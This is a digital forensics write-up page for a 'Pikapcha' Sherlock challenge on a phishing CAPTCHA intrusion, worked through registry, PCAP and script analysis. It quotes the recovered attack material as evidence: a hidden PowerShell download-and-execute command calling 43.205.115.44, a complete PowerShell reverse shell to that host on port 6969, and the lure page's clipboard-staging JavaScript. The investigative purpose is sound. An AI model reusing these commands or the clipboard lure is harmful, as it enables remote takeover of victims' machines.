@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Pikapcha - Sherlock Write Up | pumkin</title>
+<meta name="description" content="Pikapcha DFIR Sherlock write up: investigating a phishing-delivered PowerShell stager, reverse shell, and malicious CAPTCHA."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--border:rgba(255,255,255,.06);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280;--purple:#c084fc;--emerald:#34d399}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08),transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}@media(min-width:768px){main{padding:3rem 2rem}}.max-w{max-width:72rem;width:100%;margin:0 auto}.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:rgba(255,255,255,.03);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em}.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}.back-btn.active{color:#fff;border-color:#a855f7;background:rgba(168,85,247,.15)}.icon-sm{width:14px;height:14px}.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;overflow:hidden}.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}@media(min-width:768px){.writeup-body{padding:3rem}}.meta{color:var(--dim);font-size:.75rem;font-family:monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}h1{font-size:1.75rem;font-weight:800;text-transform:uppercase;margin-bottom:1.5rem}@media(min-width:768px){h1{font-size:2.5rem}}h2{font-size:1.25rem;color:var(--purple);margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}p,li{color:var(--muted);font-size:.95rem;line-height:1.75}p{margin-bottom:1rem}ul,ol{margin:0 0 1rem 1.25rem}li{margin-bottom:.25rem}strong{color:var(--text)}code{font-family:monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:var(--purple);padding:2px 6px;border-radius:6px}pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font:.8rem/1.6 monospace;color:var(--emerald);white-space:pre-wrap;overflow-wrap:anywhere}.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}.lbl{color:var(--dim);font:.65rem monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}.val{font-size:.9rem;font-weight:600}.tag{display:inline-block;padding:2px 10px;border-radius:9999px;font:.7rem monospace;letter-spacing:.1em;text-transform:uppercase}.tag-easy{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:var(--emerald)}.tag-dfir{background:rgba(168,85,247,.1);border:1px solid rgba(168,85,247,.3);color:var(--purple)}.footer{text-align:center;padding-top:3rem;color:var(--dim);font:10px monospace;letter-spacing:.15em;text-transform:uppercase}
+</style>
+</head>
+<body><div class="cyber-grid"></div><main><div class="max-w">
+<div class="nav-row"><a href="../challenges.html" class="back-btn active"><svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>Challenges</a><a href="../writeups.html" class="back-btn">Machines</a><a href="../index.html" class="back-btn">Home</a></div>
+<div class="panel"><div class="writeup-body"><p class="meta">sherlock / dfir / easy</p><h1>Pikapcha</h1>
+<div class="info-grid"><div class="info-cell"><div class="lbl">Type</div><div class="val"><span class="tag tag-dfir">DFIR</span></div></div><div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="tag tag-easy">Easy</span></div></div><div class="info-cell"><div class="lbl">Focus</div><div class="val">Windows and network forensics</div></div></div>
+
+<h2>Scenario</h2><p>Happy Grunwald contacted the sysadmin, Alonzo, after attempting to download the latest version of Microsoft Office from an update email. He visited the site and completed a CAPTCHA, but the Office download page never appeared. Having previously faced phishing attacks, Alonzo suspected an intrusion and reported the machine to the security team for isolation.</p><p>Network traffic and endpoint artifacts are provided to answer the investigation questions.</p>
+<h2>Task 1 — Initial Access Command</h2><p>What full command was run to download and execute the stager?</p><p>In the provided <code>C:\</code> directory, navigate to the profile for <code>happy.grunwald</code>. The <code>NTUSER.dat</code> hive can be analyzed with RegRipper. Search the extracted output for <code>RunMru</code>:</p><pre>RunMru
+Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+LastWrite Time 2024-09-23 05:07:45Z
+MRUList = ba
+a   %tmp%\1
+b   powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"\1</pre><p><strong>Answer:</strong></p><pre>powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"</pre>
+
+<h2>Task 2 — Payload Execution Time</h2><p>At what time in UTC did the malicious payload execute?</p><p>The timestamp is recorded in the RunMRU output from the previous task.</p><p><strong>Answer:</strong> <code>2024-09-23 05:07:45</code></p>
+
+<h2>Task 3 — PowerShell Script Hash</h2><p>The initial payload downloaded and executed a PowerShell script in memory. What is the SHA256 hash of that script?</p><p>Filter the PCAP for HTTP GET requests to the attacker-controlled address:</p><pre>ip.addr == 43.205.115.44 &amp;&amp; http.request.method == GET</pre><p>Use <strong>File → Export → HTTP</strong>, search for <code>office2024install.ps1</code>, and export the script. Calculate its SHA256 hash:</p><pre>sha256sum office2024install.ps1</pre><p><strong>Answer:</strong> <code>579284442094e1a44bea9cfb7d8d794c8977714f827c97bcb2822a97742914de</code></p>
+
+<h2>Task 4 — Reverse Shell Port</h2><p>To which port did the reverse shell connect?</p><p>The downloaded script contains a Base64-encoded PowerShell command. Decoding it reveals a TCP client connecting to <code>43.205.115.44</code> on port <code>6969</code>:</p><pre>$client = New-Object System.Net.Sockets.TCPClient("43.205.115.44",6969);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()cat: i: No such file or directory</pre><p>The decoded command is a PowerShell reverse shell that reads commands, executes them, and sends output back over the socket.</p><p><strong>Answer:</strong> <code>6969</code></p>
+
+<h2>Task 5 — Reverse Shell Duration</h2><p>For how many seconds was the reverse shell connection established between the C2 server and the victim workstation?</p><p>In Wireshark, filter the traffic:</p><pre>tcp.port == 6969</pre><p>Calculate the difference between the final and initial packet timestamps:</p><pre>549 - 146 = 403</pre><p><strong>Answer:</strong> <code>403 seconds</code></p>
+
+<h2>Task 6 — Malicious CAPTCHA Function</h2><p>The attacker hosted a malicious CAPTCHA to lure users. What is the name of the function containing the payload copied into the victim's clipboard?</p><p>Because the protocol is HTTP, the content is available in clear text. Filter for the attacker address and HTTP traffic, then follow the HTTP stream:</p><pre>ip.addr == 43.205.115.44 &amp;&amp; http</pre><p>Inspecting the page source reveals the JavaScript functions used by the CAPTCHA:</p><pre>function stageClipboard(commandToRun, verification_id){
+    const revershell=`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"`
+    const suffix = " # "
+    const ploy = "... ''I am not a robot - reCAPTCHA Verification ID: "
+    const end = "''"
+    const textToCopy = revershell
+
+    setClipboardCopyData(textToCopy);
+}</pre><p>This function copies the malicious PowerShell downloader to the user's clipboard.</p><p><strong>Answer:</strong> <code>stageClipboard</code></p>
+</div></div><p class="footer">pumkin / challenges</p>
+</div></main></body></html>
